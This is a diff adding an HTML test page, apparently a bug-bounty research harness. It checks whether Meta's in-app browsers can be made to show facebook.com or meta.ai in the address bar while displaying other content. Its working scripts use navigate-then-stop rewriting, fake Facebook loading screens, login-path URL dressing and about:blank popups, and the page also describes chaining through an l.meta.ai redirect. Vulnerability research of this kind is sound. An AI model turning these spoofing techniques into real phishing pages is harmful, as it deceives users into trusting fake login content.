@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>IAB Address-Bar Spoof Test — Meta BBP Research</title>
+<style>
+  :root { --bg:#0f1420; --card:#1a2233; --ink:#e7ecf5; --mut:#93a0b8; --ok:#3ddc97; --warn:#ffcc66; --bad:#ff6b6b; --accent:#6ea8fe; }
+  *{box-sizing:border-box} body{margin:0;font:15px/1.5 -apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--ink);padding:16px}
+  h1{font-size:18px;margin:0 0 4px} .sub{color:var(--mut);font-size:13px;margin:0 0 14px}
+  .card{background:var(--card);border:1px solid #28344b;border-radius:12px;padding:14px;margin:10px 0}
+  .card h2{font-size:14px;margin:0 0 6px} .card p{margin:4px 0;color:var(--mut);font-size:13px}
+  button{appearance:none;border:0;border-radius:9px;background:var(--accent);color:#06101f;font-weight:600;padding:10px 12px;margin:6px 6px 0 0;font-size:14px}
+  button.alt{background:#2a3850;color:var(--ink)}
+  .expect{background:#14202e;border-left:3px solid var(--warn);padding:8px 10px;border-radius:6px;font-size:13px;margin-top:8px}
+  code{background:#0b1220;border:1px solid #28344b;border-radius:5px;padding:1px 5px;font-size:12px;word-break:break-all}
+  #log{background:#0b1220;border:1px solid #28344b;border-radius:9px;padding:10px;font:12px/1.5 ui-monospace,Menlo,monospace;color:var(--mut);white-space:pre-wrap;min-height:40px;margin-top:8px}
+  .host{font:12px ui-monospace,monospace;color:var(--ok)}
+</style>
+</head>
+<body>
+<h1>IAB Address-Bar Spoof Test</h1>
+<p class="sub">Meta BBP research harness · benign test page · no data collected. Open this page inside the Facebook / Instagram / Messenger <b>in-app browser</b> on Android/iOS, then run each test and watch the IAB address bar.</p>
+
+<div class="card">
+  <h2>Where am I actually?</h2>
+  <p>Real origin of this page (what the bar SHOULD show):</p>
+  <p class="host" id="origin"></p>
+  <p>If after a test the IAB bar shows a <b>different</b> (trusted) domain while you still read this test content, the address bar is spoofable.</p>
+</div>
+
+<div class="card">
+  <h2>Test 1 — Navigate-then-stop</h2>
+  <p>Point the IAB at <code>m.facebook.com</code>, then stop the load and keep showing this page. Classic WebView bar-desync.</p>
+  <button onclick="t1()">Run Test 1</button>
+  <div class="expect">Watch for: bar flips to <b>facebook.com</b> but content stays this test page.</div>
+</div>
+
+<div class="card">
+  <h2>Test 2 — Delayed meta/location redirect</h2>
+  <p>Shows a fake "loading facebook" screen, then the bar may lag on the trusted URL after the redirect settles.</p>
+  <button onclick="t2()">Run Test 2</button>
+  <div class="expect">Watch for: bar shows <b>facebook.com</b> during/after the swap.</div>
+</div>
+
+<div class="card">
+  <h2>Test 3 — history.replaceState path dressing</h2>
+  <p>Same-origin only (can't change host), but dresses the path to read like a login URL. Tests how much of the bar the IAB shows.</p>
+  <button onclick="t3()">Run Test 3</button>
+  <div class="expect">Watch for: does the IAB show only a path/title that could pass as facebook?</div>
+</div>
+
+<div class="card">
+  <h2>Test 4 — Popup opener-URL spoof</h2>
+  <p>Opens a blank popup and writes content into it; some IABs show the opener/!trusted URL for <code>about:blank</code> docs.</p>
+  <button onclick="t4()" class="alt">Run Test 4</button>
+  <div class="expect">Watch for: popup bar shows a blank/opener URL, not the written content's origin.</div>
+</div>
+
+<div class="card">
+  <h2>Chain — reached via l.meta.ai redirect</h2>
+  <p>If you arrived here through <code>https://l.meta.ai/?u=&lt;this&gt;&amp;h=&lt;sig&gt;</code>, note whether the IAB bar still reads <b>meta.ai</b> after the redirect to this page. That is address-bar spoofing under a Meta-owned domain.</p>
+  <p>Current referrer: <span class="host" id="ref"></span></p>
+</div>
+
+<div id="log">log —</div>
+
+<script>
+  var log = function(m){ var l=document.getElementById('log'); l.textContent += "\n"+m; };
+  document.getElementById('origin').textContent = location.origin + location.pathname;
+  document.getElementById('ref').textContent = document.referrer || '(none)';
+  log('loaded at ' + location.href);
+
+  var SPOOF = 'https://m.facebook.com/';
+
+  function t1(){
+    log('T1: navigating to '+SPOOF+' then stopping…');
+    try {
+      window.location.href = SPOOF;
+      setTimeout(function(){
+        try { window.stop(); } catch(e){}
+        try {
+          document.open();
+          document.write('<meta name=viewport content="width=device-width,initial-scale=1"><body style="font:16px sans-serif;background:#0f1420;color:#e7ecf5;padding:24px"><h2>⚠ T1 result</h2><p>If the address bar now reads <b>facebook.com</b> while you read THIS, the IAB bar is spoofed. (This content is the test page, not facebook.)</p><p><a href="'+location.href+'" style="color:#6ea8fe">back</a></p></body>');
+          document.close();
+        } catch(e){ log('T1 write blocked: '+e); }
+      }, 250);
+    } catch(e){ log('T1 err '+e); }
+  }
+
+  function t2(){
+    log('T2: fake loading then redirect swap…');
+    document.body.innerHTML = '<div style="padding:40px;text-align:center"><div style="font-size:22px">facebook</div><p style="color:#93a0b8">Loading…</p></div>';
+    setTimeout(function(){
+      // try a meta-style bounce via location.replace to a same-origin page that then can't update
+      try { history.replaceState({},'', '/login'); } catch(e){}
+      document.body.innerHTML = '<div style="padding:24px"><h2>⚠ T2 result</h2><p>Check the bar now. In a vulnerable IAB the bar may read facebook.com / a login URL while this test content shows.</p></div>';
+      log('T2: swapped. bar='+location.href);
+    }, 900);
+  }
+
+  function t3(){
+    try {
+      history.replaceState({}, '', '/login.php?next=https%3A%2F%2Fwww.facebook.com%2F&ref=home');
+      log('T3: path dressed -> '+location.href);
+      alert('Look at the IAB bar: how much of the URL / what title does it show now?');
+    } catch(e){ log('T3 err '+e); }
+  }
+
+  function t4(){
+    log('T4: opening popup…');
+    var w = window.open('about:blank','_blank');
+    if(!w){ log('T4: popup blocked'); return; }
+    try {
+      w.document.write('<title>Facebook</title><body style="font:16px sans-serif;padding:24px"><h2>⚠ T4 popup</h2><p>What does the popup address bar show? (about:blank / opener / nothing?) If it looks trusted, note it.</p></body>');
+      w.document.close();
+    } catch(e){ log('T4 err '+e); }
+  }
+</script>
+</body>
+</html>
